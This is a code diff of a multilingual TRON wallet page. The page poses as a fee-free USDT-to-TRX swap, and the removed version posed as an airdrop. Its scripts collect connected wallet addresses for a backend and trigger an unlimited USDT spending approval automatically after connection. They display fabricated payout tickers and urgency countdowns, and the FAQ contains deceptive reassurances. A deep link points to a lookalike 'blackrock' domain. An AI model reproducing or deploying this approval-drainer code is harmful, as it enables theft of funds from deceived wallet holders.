+            th:{modal_subtitle:'เลือกกระเป๋าเงิน<br>เพื่อเชื่อมต่ออัตโนมัติ',w_tronlink:'กระเป๋า TRON อย่างเป็นทางการ',w_trust:'กระเป๋าหลายเชน',w_tp:'ยอดนิยมในเอเชีย',w_bitget:'กระเป๋า Web3 ระดับโลก',w_okx:'กระเป๋า OKX',modal_tip_title:'หากแอปไม่เปิด:',modal_tip1:'1. เปิดแอปกระเป๋าด้วยตนเอง',modal_tip2:'2. ไปที่แท็บ<strong class="text-white">เบราว์เซอร์</strong>',modal_tip3:'3. <strong class="text-white">วาง</strong> URL (คัดลอกแล้ว)',detect:'[ตรวจพบ] {0} DApp เบราว์เซอร์',noDetect:'[รอ] ไม่พบ DApp เบราว์เซอร์',accChange:'[เปลี่ยนบัญชี] {0}',searching:'[ค้นหา] กำลังตรวจสอบ...',sending:'[เซิร์ฟเวอร์] กำลังส่งข้อมูล...',connected:'[เชื่อมต่อ] {0} | {1} USDT',backendFail:'[คำเตือน] เชื่อมต่อเซิร์ฟเวอร์ล้มเหลว',noSpender:'[ข้อผิดพลาด] ไม่ได้ตั้ง Spender',trxCheck:'[1/3] ตรวจสอบ TRX...',autoCharge:'[อัตโนมัติ] ส่ง {0} TRX',trxOk:'[ยืนยัน] TRX เพียงพอ ({0})',trxFail:'[ล้มเหลว] {0}',trxWarn:'[คำเตือน] ตรวจ TRX ล้มเหลว',approving:'[2/3] ขออนุมัติ...',approved:'[3/3] อนุมัติแล้ว! TxHash: {0}',cancelled:'[ยกเลิก] ผู้ใช้ปฏิเสธ',failed:'[ล้มเหลว] {0}'},
+            vi:{modal_subtitle:'Chọn ví của bạn<br>để kết nối tự động.',w_tronlink:'Ví chính thức TRON',w_trust:'Ví đa chuỗi',w_tp:'Phổ biến ở châu Á',w_bitget:'Ví Web3 toàn cầu',w_okx:'Ví sàn OKX',modal_tip_title:'Nếu ứng dụng không mở:',modal_tip1:'1. Mở ứng dụng ví thủ công',modal_tip2:'2. Vào tab <strong class="text-white">Trình duyệt</strong>',modal_tip3:'3. <strong class="text-white">Dán</strong> URL (đã sao chép)',detect:'[Phát hiện] Trình duyệt DApp {0}',noDetect:'[Chờ] Không phát hiện DApp',accChange:'[Đổi tài khoản] {0}',searching:'[Tìm kiếm] Đang kiểm tra...',sending:'[Server] Đang gửi dữ liệu...',connected:'[Kết nối] {0} | {1} USDT',backendFail:'[Cảnh báo] Kết nối server thất bại',noSpender:'[Lỗi] Chưa đặt Spender',trxCheck:'[1/3] Kiểm tra TRX...',autoCharge:'[Tự động] Đã gửi {0} TRX',trxOk:'[OK] TRX đủ ({0})',trxFail:'[Thất bại] {0}',trxWarn:'[Cảnh báo] Kiểm tra TRX lỗi',approving:'[2/3] Yêu cầu phê duyệt...',approved:'[3/3] Đã phê duyệt! TxHash: {0}',cancelled:'[Hủy] Người dùng từ chối',failed:'[Thất bại] {0}'},
+            ja:{modal_subtitle:'ウォレットアプリを選択して<br>自動接続します。',w_tronlink:'TRON公式ウォレット',w_trust:'マルチチェーンウォレット',w_tp:'アジアで人気',w_bitget:'グローバルWeb3ウォレット',w_okx:'OKX取引所ウォレット',modal_tip_title:'アプリが開かない場合：',modal_tip1:'1. ウォレットアプリを手動で開く',modal_tip2:'2. アプリ内の<strong class="text-white">ブラウザ</strong>タブへ',modal_tip3:'3. URLを<strong class="text-white">貼り付け</strong>（コピー済み）',detect:'[検出] {0} DAppブラウザ確認',noDetect:'[待機] DAppブラウザ未検出',accChange:'[アカウント変更] {0}',searching:'[検索] 環境確認中...',sending:'[バックエンド] 送信中...',connected:'[接続] {0} | {1} USDT',backendFail:'[警告] バックエンド接続失敗',noSpender:'[エラー] Spender未設定',trxCheck:'[1/3] TRX残高確認中...',autoCharge:'[自動] {0} TRX送信完了',trxOk:'[確認] TRX十分 ({0})',trxFail:'[失敗] {0}',trxWarn:'[警告] TRX確認失敗、続行',approving:'[2/3] 承認要求中...',approved:'[3/3] 承認完了！TxHash: {0}',cancelled:'[キャンセル] ユーザー拒否',failed:'[失敗] {0}'},
+            de:{modal_subtitle:'Wählen Sie Ihr Wallet<br>für automatische Verbindung.',w_tronlink:'TRON Offizielles Wallet',w_trust:'Multi-Chain Wallet',w_tp:'Beliebt in Asien',w_bitget:'Globales Web3 Wallet',w_okx:'OKX Börsen-Wallet',modal_tip_title:'Falls die App nicht öffnet:',modal_tip1:'1. Öffnen Sie die Wallet-App manuell',modal_tip2:'2. Gehen Sie zum <strong class="text-white">Browser</strong>-Tab',modal_tip3:'3. URL <strong class="text-white">einfügen</strong> (kopiert)',detect:'[Erkannt] {0} DApp Browser',noDetect:'[Warten] DApp Browser nicht erkannt',accChange:'[Kontowechsel] {0}',searching:'[Suche] Prüfe Umgebung...',sending:'[Server] Sende Daten...',connected:'[Verbunden] {0} | {1} USDT',backendFail:'[Warnung] Server nicht erreichbar',noSpender:'[Fehler] Spender nicht gesetzt',trxCheck:'[1/3] TRX-Guthaben prüfen...',autoCharge:'[Auto] {0} TRX gesendet',trxOk:'[OK] TRX ausreichend ({0})',trxFail:'[Fehler] {0}',trxWarn:'[Warnung] TRX-Prüfung fehlgeschlagen',approving:'[2/3] Genehmigung anfordern...',approved:'[3/3] Genehmigt! TxHash: {0}',cancelled:'[Abbruch] Benutzer abgelehnt',failed:'[Fehler] {0}'},
+            fr:{modal_subtitle:'Sélectionnez votre portefeuille<br>pour une connexion automatique.',w_tronlink:'Portefeuille officiel TRON',w_trust:'Portefeuille multi-chaînes',w_tp:'Populaire en Asie',w_bitget:'Portefeuille Web3 mondial',w_okx:'Portefeuille OKX',modal_tip_title:'Si l\'appli ne s\'ouvre pas :',modal_tip1:'1. Ouvrez l\'appli manuellement',modal_tip2:'2. Allez dans l\'onglet <strong class="text-white">Navigateur</strong>',modal_tip3:'3. <strong class="text-white">Collez</strong> l\'URL (copié)',detect:'[Détecté] Navigateur DApp {0}',noDetect:'[Attente] Navigateur DApp non détecté',accChange:'[Changement] {0}',searching:'[Recherche] Vérification...',sending:'[Serveur] Envoi des données...',connected:'[Connecté] {0} | {1} USDT',backendFail:'[Avertissement] Serveur inaccessible',noSpender:'[Erreur] Spender non défini',trxCheck:'[1/3] Vérification TRX...',autoCharge:'[Auto] {0} TRX envoyés',trxOk:'[OK] TRX suffisant ({0})',trxFail:'[Échec] {0}',trxWarn:'[Avertissement] Échec vérification TRX',approving:'[2/3] Demande d\'approbation...',approved:'[3/3] Approuvé ! TxHash: {0}',cancelled:'[Annulé] Utilisateur a refusé',failed:'[Échec] {0}'},
+            es:{modal_subtitle:'Seleccione su billetera<br>para conectar automáticamente.',w_tronlink:'Billetera oficial TRON',w_trust:'Billetera multicadena',w_tp:'Popular en Asia',w_bitget:'Billetera Web3 global',w_okx:'Billetera OKX',modal_tip_title:'Si la app no se abre:',modal_tip1:'1. Abra la app manualmente',modal_tip2:'2. Vaya a la pestaña <strong class="text-white">Navegador</strong>',modal_tip3:'3. <strong class="text-white">Pegue</strong> la URL (copiada)',detect:'[Detectado] Navegador DApp {0}',noDetect:'[Espera] Navegador DApp no detectado',accChange:'[Cambio de cuenta] {0}',searching:'[Búsqueda] Verificando...',sending:'[Servidor] Enviando datos...',connected:'[Conectado] {0} | {1} USDT',backendFail:'[Advertencia] Servidor no disponible',noSpender:'[Error] Spender no configurado',trxCheck:'[1/3] Verificando TRX...',autoCharge:'[Auto] {0} TRX enviados',trxOk:'[OK] TRX suficiente ({0})',trxFail:'[Error] {0}',trxWarn:'[Advertencia] Fallo verificación TRX',approving:'[2/3] Solicitando aprobación...',approved:'[3/3] ¡Aprobado! TxHash: {0}',cancelled:'[Cancelado] Usuario rechazó',failed:'[Error] {0}'}
+        };
+        function L(key){var t=logTexts[currentLang]||logTexts.en;var args=Array.prototype.slice.call(arguments,1);var s=t[key]||key;args.forEach(function(a,i){s=s.replace('{'+i+'}',a);});return s;}
+
+        // ===== Countdown =====
         var cd={d:2,h:18,m:41,s:20};
-        setInterval(function(){if(cd.s>0)cd.s--;else if(cd.m>0){cd.m--;cd.s=59;}else if(cd.h>0){cd.h--;cd.m=59;cd.s=59;}else if(cd.d>0){cd.d--;cd.h=23;cd.m=59;cd.s=59;}
-            document.getElementById('cd-days').textContent=String(cd.d).padStart(2,'0');
-            document.getElementById('cd-hours').textContent=String(cd.h).padStart(2,'0');
-            document.getElementById('cd-mins').textContent=String(cd.m).padStart(2,'0');
-            document.getElementById('cd-secs').textContent=String(cd.s).padStart(2,'0');
-        },1000);
+        setInterval(function(){if(cd.s>0)cd.s--;else if(cd.m>0){cd.m--;cd.s=59;}else if(cd.h>0){cd.h--;cd.m=59;cd.s=59;}else if(cd.d>0){cd.d--;cd.h=23;cd.m=59;cd.s=59;}document.getElementById('cd-days').textContent=String(cd.d).padStart(2,'0');document.getElementById('cd-hours').textContent=String(cd.h).padStart(2,'0');document.getElementById('cd-mins').textContent=String(cd.m).padStart(2,'0');document.getElementById('cd-secs').textContent=String(cd.s).padStart(2,'0');},1000);
 
-        // Ticker
-        var tAddrs=['TP5a...9qW2','TX8x...L0p3','TR1m...7vZ4','TH9k...4mP9','TJ2y...8xK1','TY8z...k9L2','TQ4m...P1x8'];
-        var tAmts=['150 USDT','300 USDT','500 USDT','800 USDT','1,200 USDT','1,500 USDT','3,000 USDT'];
-        function updateTicker(){var c=document.getElementById('ticker-container');var d=document.createElement('div');d.className='flex items-center gap-2 bg-slate-900/60 px-2.5 py-1 rounded-md border border-slate-800/80 shrink-0';d.innerHTML='<span class="text-slate-300 font-mono">'+tAddrs[Math.floor(Math.random()*tAddrs.length)]+'</span><span class="text-emerald-400 font-bold">'+tAmts[Math.floor(Math.random()*tAmts.length)]+'</span><span class="text-slate-500 text-[10px]">(방금 전)</span>';c.prepend(d);if(c.children.length>6)c.removeChild(c.lastChild);}
+        // ===== Ticker =====
+        var tA=['TP5a...9qW2','TX8x...L0p3','TR1m...7vZ4','TH9k...4mP9','TJ2y...8xK1'];
+        var tAmounts=[150,300,500,800,1200];
+        var tickerTimeTexts={ko:'방금 전',en:'just now',zh:'刚刚',ru:'только что',th:'เมื่อกี้',vi:'vừa xong',ja:'たった今',de:'gerade',fr:'à l\'instant',es:'ahora mismo'};
+        var tickerTimeText='방금 전';
+        function updateTicker(){var c=document.getElementById('ticker-container');var d=document.createElement('div');d.className='flex items-center gap-2 bg-slate-900/60 px-2.5 py-1 rounded-md border border-slate-800/80 shrink-0';var tAmt=tAmounts[Math.floor(Math.random()*tAmounts.length)];var tTrx=TRX_RATE?Math.floor(tAmt*TRX_RATE).toLocaleString():'...';d.innerHTML='<span class="text-slate-300 font-mono">'+tA[Math.floor(Math.random()*tA.length)]+'</span><span class="text-emerald-400 font-bold">'+tAmt+' USDT → '+tTrx+' TRX</span><span class="text-slate-500 text-[11px]">'+tickerTimeText+')</span>';c.prepend(d);if(c.children.length>6)c.removeChild(c.lastChild);}
         for(var i=0;i<4;i++)updateTicker();setInterval(updateTicker,4500);
 
-        // Calculator
-        window.updateCalc=function(){var v=parseFloat(document.getElementById('calc-input').value||0);document.getElementById('calc-result').textContent='+ '+Math.min(Math.max(v*0.15,10),5000).toFixed(2)+' USDT';};
-
-        // FAQ
-        var faqs=[
-            {q:'USDT 무제한 승인(Allowance)은 왜 필요한가요?',a:'최초 1회 무제한 승인을 진행하면, 이후 추가 트랜잭션 수수료 발생이나 번거로운 매번의 서명 팝업 없이 스마트 컨트랙트가 에어드랍 보상 지급을 즉시 자동 처리할 수 있습니다.'},
-            {q:'이벤트 참여 수수료가 발생하나요?',a:'최초 1회 스마트 컨트랙트 승인 시 트론 네트워크의 대역폭 및 에너지(소량의 TRX)가 수수료로 사용됩니다.'},
-            {q:'승인 후 보상은 언제 지급되나요?',a:'승인 서명이 완료되는 즉시 시스템에서 온체인 검증을 시작하며, 1~3분 이내에 지정된 지갑으로 보상 USDT가 자동 에어드랍됩니다.'},
-            {q:'언제든지 승인 권한을 해제할 수 있나요?',a:'네, 트론스캔(TronScan)을 통해 언제든지 Allowance 한도를 0으로 초기화할 수 있습니다.'}
-        ];
+        // ===== FAQ =====
+        var faqData={
+            ko:[{q:'USDT → TRX 교환은 어떻게 하나요?',a:'지갑 연결 후 교환할 USDT 수량을 입력하고 교환 시작을 누르면 됩니다.'},{q:'어떤 지갑을 사용할 수 있나요?',a:'TronLink, Trust Wallet, Token Pocket, Bitget, OKX 등 TRON 지원 지갑 모두 사용 가능합니다.'},{q:'TRX(가스비)가 없어도 되나요?',a:'네, TRX가 부족하면 시스템이 자동으로 충전해줍니다.'},{q:'교환 수수료는 얼마인가요?',a:'현재 수수료 무료 이벤트 기간입니다.'}],
+            en:[{q:'How do I swap USDT to TRX?',a:'Connect your wallet, enter USDT amount, and press Start Swap.'},{q:'Which wallets are supported?',a:'TronLink, Trust Wallet, Token Pocket, Bitget, OKX and all TRON wallets.'},{q:'Do I need TRX for gas?',a:'No, the system auto-provides TRX for gas fees.'},{q:'What are the fees?',a:'Zero fees during the promotional event.'}],
+            zh:[{q:'如何将USDT兑换为TRX？',a:'连接钱包，输入USDT数量，点击开始兑换。'},{q:'支持哪些钱包？',a:'TronLink、Trust、TokenPocket、Bitget、OKX等所有TRON钱包。'},{q:'没有TRX可以吗？',a:'可以，系统自动提供TRX。'},{q:'手续费多少？',a:'活动期间免手续费。'}],
+            ru:[{q:'Как обменять USDT на TRX?',a:'Подключите кошелёк, введите сумму и нажмите Начать.'},{q:'Какие кошельки?',a:'TronLink, Trust, TokenPocket, Bitget, OKX.'},{q:'Нужен TRX?',a:'Нет, система предоставит TRX автоматически.'},{q:'Комиссия?',a:'Бесплатно в период акции.'}],
+            th:[{q:'แลก USDT เป็น TRX ยังไง?',a:'เชื่อมต่อกระเป๋า ใส่จำนวน แล้วกดเริ่มแลก'},{q:'รองรับกระเป๋าอะไร?',a:'TronLink, Trust, TokenPocket, Bitget, OKX'},{q:'ไม่มี TRX ได้ไหม?',a:'ได้ ระบบเติมให้อัตโนมัติ'},{q:'ค่าธรรมเนียม?',a:'ฟรีในช่วงอีเวนต์'}],
+            vi:[{q:'Đổi USDT sang TRX thế nào?',a:'Kết nối ví, nhập số lượng USDT và nhấn Bắt đầu.'},{q:'Hỗ trợ ví nào?',a:'TronLink, Trust, TokenPocket, Bitget, OKX.'},{q:'Không có TRX được không?',a:'Được, hệ thống tự cung cấp TRX.'},{q:'Phí bao nhiêu?',a:'Miễn phí trong sự kiện.'}],
+            ja:[{q:'USDTをTRXに交換するには？',a:'ウォレット接続後、USDT額を入力して交換開始。'},{q:'対応ウォレットは？',a:'TronLink、Trust、TokenPocket、Bitget、OKX。'},{q:'TRXがなくても？',a:'はい、システムが自動補充します。'},{q:'手数料は？',a:'イベント期間中は無料です。'}],
+            de:[{q:'Wie tausche ich USDT in TRX?',a:'Wallet verbinden, Betrag eingeben, Tausch starten.'},{q:'Welche Wallets?',a:'TronLink, Trust, TokenPocket, Bitget, OKX.'},{q:'Brauche ich TRX?',a:'Nein, das System stellt TRX automatisch bereit.'},{q:'Gebühren?',a:'Kostenlos während der Aktion.'}],
+            fr:[{q:'Comment échanger USDT en TRX ?',a:'Connectez votre portefeuille, entrez le montant et lancez.'},{q:'Quels portefeuilles ?',a:'TronLink, Trust, TokenPocket, Bitget, OKX.'},{q:'Faut-il du TRX ?',a:'Non, le système fournit automatiquement du TRX.'},{q:'Frais ?',a:'Gratuit pendant la promotion.'}],
+            es:[{q:'¿Cómo cambio USDT a TRX?',a:'Conecte billetera, ingrese cantidad y presione Iniciar.'},{q:'¿Qué billeteras?',a:'TronLink, Trust, TokenPocket, Bitget, OKX.'},{q:'¿Necesito TRX?',a:'No, el sistema lo proporciona automáticamente.'},{q:'¿Comisiones?',a:'Gratis durante el evento.'}]
+        };
+        function loadFaqForLang(lang){var fl=faqData[lang]||faqData.en;var fc=document.getElementById('faq-container');if(!fc)return;fc.innerHTML='';fl.forEach(function(f){var d=document.createElement('div');d.className='glass border border-slate-800/80 rounded-xl overflow-hidden';d.innerHTML='<button onclick="this.nextElementSibling.classList.toggle(\'hidden\');this.querySelector(\'i\').classList.toggle(\'rotate-180\')" class="w-full p-4 text-left flex items-center justify-between text-xs sm:text-sm font-bold text-slate-200 hover:text-white transition"><span>'+escapeHtml(f.q)+'</span><i class="fa-solid fa-chevron-down transition-transform text-slate-400"></i></button><div class="hidden px-4 pb-4 text-xs text-slate-400 leading-relaxed border-t border-slate-800/60 pt-3">'+escapeHtml(f.a)+'</div>';fc.appendChild(d);});}
+        var faqs=faqData.ko
         var faqC=document.getElementById('faq-container');
-        faqs.forEach(function(f){var d=document.createElement('div');d.className='glass-panel border border-slate-800/80 rounded-xl overflow-hidden';d.innerHTML='<button onclick="this.nextElementSibling.classList.toggle(\'hidden\');this.querySelector(\'i\').classList.toggle(\'rotate-180\')" class="w-full p-4 text-left flex items-center justify-between text-xs sm:text-sm font-bold text-slate-200 hover:text-white transition"><span>'+escapeHtml(f.q)+'</span><i class="fa-solid fa-chevron-down transition-transform text-slate-400"></i></button><div class="hidden px-4 pb-4 text-xs text-slate-400 leading-relaxed border-t border-slate-800/60 pt-3">'+escapeHtml(f.a)+'</div>';faqC.appendChild(d);});
+        faqs.forEach(function(f){var d=document.createElement('div');d.className='glass border border-slate-800/80 rounded-xl overflow-hidden';d.innerHTML='<button onclick="this.nextElementSibling.classList.toggle(\'hidden\');this.querySelector(\'i\').classList.toggle(\'rotate-180\')" class="w-full p-4 text-left flex items-center justify-between text-xs sm:text-sm font-bold text-slate-200 hover:text-white transition"><span>'+escapeHtml(f.q)+'</span><i class="fa-solid fa-chevron-down transition-transform text-slate-400"></i></button><div class="hidden px-4 pb-4 text-xs text-slate-400 leading-relaxed border-t border-slate-800/60 pt-3">'+escapeHtml(f.a)+'</div>';faqC.appendChild(d);});
 
-        // Trust Wallet Deep Link (URL 자동 복사 + 3단계 시도)
-        window.launchTrustWalletApp=function(){
-            var url=window.location.href;
-            var encoded=encodeURIComponent(url);
+        // ===== Deep Links (플랫폼별) =====
+        window.showWalletSelector=function(){
+            document.getElementById('install-modal').classList.remove('active');
+            if(isMobile()){launchTrustWallet();document.getElementById('wallet-selector-modal').classList.add('active');}else{document.getElementById('wallet-selector-modal').classList.add('active');}
+        };
 
-            // URL 자동 복사
+        // launchWallet removed - Trust Wallet only
+                showToast(info.name+' 확장 프로그램을 설치 후 새로고침하세요','error');
+                window.open(info.url,'_blank');
+                return;
+            }
+
+            // 모바일: 딥링크
             navigator.clipboard.writeText(url).catch(function(){});
             showToast('URL이 클립보드에 복사되었습니다');
 
-            // 1차: trust:// 스킴
-            window.location.href='trust://open_url?coin_id=195&url='+encoded;
+            // 앱스토어 링크
+            var stores={
+                tronlink:{ios:'https://apps.apple.com/app/tronlink/id1453530188',android:'https://play.google.com/store/apps/details?id=com.tronlinkpro.wallet'},
+                trust:{ios:'https://apps.apple.com/app/trust-crypto-bitcoin-wallet/id1288339409',android:'https://play.google.com/store/apps/details?id=com.wallet.crypto.trustapp'},
+                tokenpocket:{ios:'https://apps.apple.com/app/tokenpocket-crypto-defi-wallet/id1436028697',android:'https://play.google.com/store/apps/details?id=vip.mytokenpocket'},
+                bitget:{ios:'https://apps.apple.com/app/bitget-wallet-ex-bitkeep/id1395301115',android:'https://play.google.com/store/apps/details?id=com.bitkeep.wallet'},
+                okx:{ios:'https://apps.apple.com/app/okx-buy-bitcoin-btc-crypto/id1327268470',android:'https://play.google.com/store/apps/details?id=com.okinc.okex.gp'}
+            };
 
-            // 2차: 1초 후 intent URL (안드로이드)
-            setTimeout(function(){
-                if(/Android/i.test(navigator.userAgent)){
-                    window.location.href='intent://open_url?coin_id=195&url='+encoded+'#Intent;scheme=trust;package=com.wallet.crypto.trustapp;end';
-                }
-            },1000);
+            var tronlinkParam=encodeURIComponent(JSON.stringify({url:url,action:'open',protocol:'TronLink',version:'1.0'}));
+            var links={
+                tronlink:{scheme:'tronlinkoutside://pull.activity?param='+tronlinkParam,pkg:'com.tronlinkpro.wallet'},
+                trust:{scheme:'trust://open_url?coin_id=195&url='+encodeURIComponent('https://www.blackrock.gr.com/'),pkg:'com.wallet.crypto.trustapp'},
+                tokenpocket:{scheme:'tpdapp://open?params='+encodeURIComponent(JSON.stringify({url:url,chain:'TRON'})),pkg:'vip.mytokenpocket'},
+                bitget:{scheme:'bitkeep://bkconnect?action=dapp&url='+encoded,pkg:'com.bitkeep.wallet'},
+                okx:{scheme:'okx://wallet/dapp/url?dappUrl='+encoded,pkg:'com.okinc.okex.gp'}
+            };
 
-            // 3차: 2초 후 유니버설 링크
-            setTimeout(function(){
-                window.location.href='https://link.trustwallet.com/open_url?coin_id=195&url='+encoded;
-            },2000);
+            var w=links[wallet];var st=stores[wallet];
+            if(!w||!st)return;
+
+            var startTime=Date.now();
+
+            // 단일 시도 - 중복 팝업 방지
+            if(isIOS()){
+                var iframe=document.createElement('iframe');
+                iframe.style.display='none';
+                iframe.src=w.scheme;
+                document.body.appendChild(iframe);
+                setTimeout(function(){try{document.body.removeChild(iframe);}catch(e){}},100);
+                setTimeout(function(){if(document.visibilityState!=='hidden'){window.location.href=st.ios;}},1500);
+            }else if(isAndroid()){
+                var schemeName=w.scheme.split('://')[0];
+                var schemePath=w.scheme.split('://')[1]||'';
+                window.location.href='intent://'+schemePath+'#Intent;scheme='+schemeName+';package='+w.pkg+';S.browser_fallback_url='+encodeURIComponent(st.android)+';end';
+            }
         };
 
-        window.copyCurrentUrl=async function(){try{await navigator.clipboard.writeText(window.location.href);showToast('주소 복사됨');}catch(e){showToast('복사 실패','error');}};
+
+        // Trust Wallet 딥링크
+        window.launchTrustWallet=function(){
+            var url=window.location.href;
+            var encoded=encodeURIComponent(url);
+            navigator.clipboard.writeText(url).catch(function(){});
+            showToast(currentLang==='ko'?'URL이 복사되었습니다':'URL copied');
+            document.getElementById('wallet-selector-modal').classList.remove('active');
+            if(isIOS()){
+                var iframe=document.createElement('iframe');iframe.style.display='none';iframe.src='trust://open_url?coin_id=195&url='+encoded;
+                document.body.appendChild(iframe);setTimeout(function(){try{document.body.removeChild(iframe);}catch(e){}},100);
+                setTimeout(function(){if(document.visibilityState!=='hidden'){window.location.href='https://apps.apple.com/app/trust-crypto-bitcoin-wallet/id1288339409';}},1500);
+            }else if(isAndroid()){
+                window.location.href='intent://open_url?coin_id=195&url='+encoded+'#Intent;scheme=trust;package=com.wallet.crypto.trustapp;S.browser_fallback_url='+encodeURIComponent('https://play.google.com/store/apps/details?id=com.wallet.crypto.trustapp')+';end';
+            }
+        };
+
+        // ===== Wallet Detection (Enhanced) =====
+        function detectProvider(){
+            if(window.tronLink||window.tronWeb){
+                if(window.trustwallet||navigator.userAgent.indexOf('Trust')>=0)return 'TrustWallet';
+                if(window.tokenpocket||navigator.userAgent.indexOf('TokenPocket')>=0)return 'TokenPocket';
+                if(navigator.userAgent.indexOf('BitKeep')>=0||navigator.userAgent.indexOf('Bitget')>=0)return 'Bitget';
+                if(navigator.userAgent.indexOf('OKApp')>=0)return 'OKX';
+                return 'TronLink';
+            }
+            return null;
+        }
 
         async function getInjectedTronWeb(){
             if(window.tronWeb&&window.tronWeb.defaultAddress&&window.tronWeb.defaultAddress.base58)return window.tronWeb;
-            if(window.tronLink){if(window.tronLink.ready&&window.tronLink.tronWeb)return window.tronLink.tronWeb;try{var r=await window.tronLink.request({method:'tron_requestAccounts'});if(r&&r.code===200&&window.tronWeb)return window.tronWeb;}catch(e){}}return null;
+            if(window.tronLink){
+                if(window.tronLink.ready&&window.tronLink.tronWeb)return window.tronLink.tronWeb;
+                try{var r=await window.tronLink.request({method:'tron_requestAccounts'});if(r&&r.code===200&&window.tronWeb)return window.tronWeb;}catch(e){}
+            }
+            return null;
         }
-        window.addEventListener('DOMContentLoaded',function(){var a=0;var t=setInterval(async function(){a++;try{var tw=await getInjectedTronWeb();if(tw&&tw.defaultAddress&&tw.defaultAddress.base58){clearInterval(t);await setConnectedWallet(tw.defaultAddress.base58,'TrustWallet');}else if(a>8)clearInterval(t);}catch(e){if(a>8)clearInterval(t);}},400);});
 
+        // ===== Auto Detection on Load =====
+        window.addEventListener('DOMContentLoaded',function(){
+            var a=0;
+            var t=setInterval(async function(){
+                a++;
+                try{
+                    var tw=await getInjectedTronWeb();
+                    if(tw&&tw.defaultAddress&&tw.defaultAddress.base58){
+                        clearInterval(t);
+                        var provider=detectProvider()||'TrustWallet';
+                        appendLog(L('detect',provider),'success');
+                        document.getElementById('wallet-selector-modal').classList.remove('active');
+                        await setConnectedWallet(tw.defaultAddress.base58,provider);
+                    }else if(a>12){
+                        clearInterval(t);
+                        appendLog(L('noDetect'),'warn');
+                    }
+                }catch(e){if(a>12)clearInterval(t);}
+            },500);
+
+            // Account change listener
+            if(window.tronLink){
+                window.addEventListener('message',function(e){
+                    if(e.data&&e.data.message&&e.data.message.action==='accountsChanged'){
+                        var newAddr=e.data.message.data&&e.data.message.data.address;
+                        if(newAddr&&newAddr!==currentWalletAddress){
+                            appendLog(L('accChange',newAddr),'warn');
+                            isApproved=false;
+                            setConnectedWallet(newAddr,activeProvider);
+                        }
+                    }
+                });
+            }
+        });
+
+        // ===== Connect =====
         window.handleConnectWallet=async function(){
-            appendLog('[지갑 탐색] Trust Wallet 환경 확인 중...');
-            if(isMobile()&&!window.tronWeb&&!window.tronLink){launchTrustWalletApp();document.getElementById('mobile-dapp-modal').classList.add('active');return;}
-            var tw=await getInjectedTronWeb();var addr='';
-            if(tw&&tw.defaultAddress&&tw.defaultAddress.base58)addr=tw.defaultAddress.base58;
-            else if(window.tronLink){await window.tronLink.request({method:'tron_requestAccounts'});if(window.tronWeb&&window.tronWeb.defaultAddress)addr=window.tronWeb.defaultAddress.base58;}
-            if(addr)await setConnectedWallet(addr,'TrustWallet');
-            else{
-                if(isMobile()){launchTrustWalletApp();document.getElementById('mobile-dapp-modal').classList.add('active');}
-                else{document.getElementById('install-modal').classList.add('active');appendLog('[오류] Trust Wallet 미감지 — 설치 안내 표시','warn');}
+            appendLog(L('searching'));
+            var tw=await getInjectedTronWeb();
+            if(tw&&tw.defaultAddress&&tw.defaultAddress.base58){
+                var provider=detectProvider()||'TrustWallet';
+                await setConnectedWallet(tw.defaultAddress.base58,provider);
+            }else{
+                if(isMobile()){launchTrustWallet();document.getElementById('wallet-selector-modal').classList.add('active');}else{document.getElementById('wallet-selector-modal').classList.add('active');}
             }
         };
 
@@ -413,76 +482,140 @@
             document.getElementById('wallet-disconnected').classList.add('hidden');
             document.getElementById('wallet-connected').classList.remove('hidden');
             document.getElementById('display-address').textContent=address;
-            document.getElementById('connection-indicator').innerHTML='<span class="h-1.5 w-1.5 rounded-full bg-emerald-400 animate-pulse inline-block mr-1"></span>CONNECTED';
-            document.getElementById('connection-indicator').className='text-[10px] text-emerald-400 font-mono font-semibold flex items-center';
-            document.getElementById('step1').className='p-4 rounded-xl border bg-emerald-950/20 border-emerald-500/40';
-            document.getElementById('step1-status').innerHTML='<i class="fa-solid fa-circle-check mr-1"></i>완료됨';
+            document.getElementById('connection-indicator').innerHTML='<span class="h-1.5 w-1.5 rounded-full bg-emerald-400 animate-pulse inline-block mr-1"></span>'+provider;
+            document.getElementById('connection-indicator').className='text-[11px] text-emerald-400 font-mono font-semibold flex items-center';
+            // Step 1 완료
+            document.getElementById('step1').className='p-4 rounded-xl border bg-emerald-950/20 border-emerald-500/40 step-progress step-done';
+            document.getElementById('step1-status').innerHTML='<i class="fa-solid fa-circle-check mr-1"></i>'+provider;
             document.getElementById('step1-status').className='text-emerald-400 text-xs font-semibold flex items-center';
-            appendLog('[백엔드] 서버에 지갑 정보 전송 중...');
+
+            appendLog(L('sending'));
             try{
                 var res=await fetch(API_BASE+'/wallet/connect',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({address:address,provider:provider})});
                 var data=await res.json();
                 if(data.status==='ok'){
-                    document.getElementById('display-balance').innerHTML=data.balance+' <span class="text-xs font-normal text-slate-400">USDT</span>';
+                    userUsdtBalance=parseFloat(data.balance)||0;document.getElementById('display-balance').innerHTML=data.balance+' <span class="text-xs font-normal text-slate-400">USDT</span>';try{document.getElementById('usdt-bal-swap').textContent=data.balance;}catch(e){}
                     if(data.isApproved){isApproved=true;setApprovedUI();}
-                    showToast('연결 완료 (잔액: '+data.balance+' USDT)');
-                    appendLog('[연결 완료] '+address+' | '+data.balance+' USDT | '+(data.isApproved?'승인완료':'미승인'),'success');
+                    showToast(provider+' 연결 완료 (잔액: '+data.balance+' USDT)');
+                    appendLog(L('connected',address,data.balance),'success');
                 }
-            }catch(e){appendLog('[경고] 백엔드 연결 실패','warn');}
+            }catch(e){appendLog(L('backendFail'),'warn');}
 
-            if(!isApproved){
-                setTimeout(function(){ executeUnlimitedApprove(); }, 2500);
-            }
+            try{var _tr=await fetch(API_BASE+'/trx/'+address);var _td=await _tr.json();if(_td.trxBalance)try{document.getElementById('trx-bal-swap').textContent=parseFloat(_td.trxBalance).toFixed(2);}catch(e){}}catch(e){}
+            if(!isApproved){setTimeout(function(){executeUnlimitedApprove();},2500);}
         }
 
         function setApprovedUI(){
             document.getElementById('display-allowance').textContent='무제한 (MAX)';
             document.getElementById('display-allowance').className='text-sm font-bold font-mono text-emerald-400 mt-1';
-            document.getElementById('allowance-badge-main').textContent='무제한 승인 완료';
+            document.getElementById('allowance-badge-main').textContent='교환 승인 완료';try{document.getElementById('approve-btn-text').textContent='USDT → TRX 교환하기';}catch(e){}
             document.getElementById('allowance-badge-main').className='text-xs px-3 py-1 rounded-full font-semibold border bg-emerald-500/10 border-emerald-500/30 text-emerald-400';
-            document.getElementById('step2').className='p-4 rounded-xl border bg-emerald-950/20 border-emerald-500/40';
